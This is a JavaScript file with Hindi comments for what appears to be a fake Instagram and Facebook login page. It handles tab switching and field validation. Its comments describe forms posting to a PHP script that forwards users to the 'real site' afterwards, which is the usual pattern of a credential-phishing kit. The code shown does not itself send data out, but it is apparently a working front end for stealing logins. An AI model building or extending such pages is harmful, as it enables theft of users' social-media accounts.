// Tab switching between Instagram and Facebook
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', function() {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.login-form').forEach(f => f.classList.remove('active'));
        
        this.classList.add('active');
        const platform = this.dataset.platform;
        document.getElementById(platform + '-login').classList.add('active');
    });
});

// सबमिट होने पर असली साइट पर रीडायरेक्ट होगा
document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', function(e) {
        // फॉर्म नॉर्मल तरीके से PHP को सबमिट होगा
        // PHP redirect.php पर भेजेगा जो असली साइट पर ले जाएगा
    });
});

// फील्ड खाली न हो
document.querySelectorAll('input').forEach(input => {
    input.addEventListener('invalid', function(e) {
        this.style.borderColor = '#ed4956';
    });
    input.addEventListener('input', function() {
        this.style.borderColor = '#dbdbdb';
    });
});
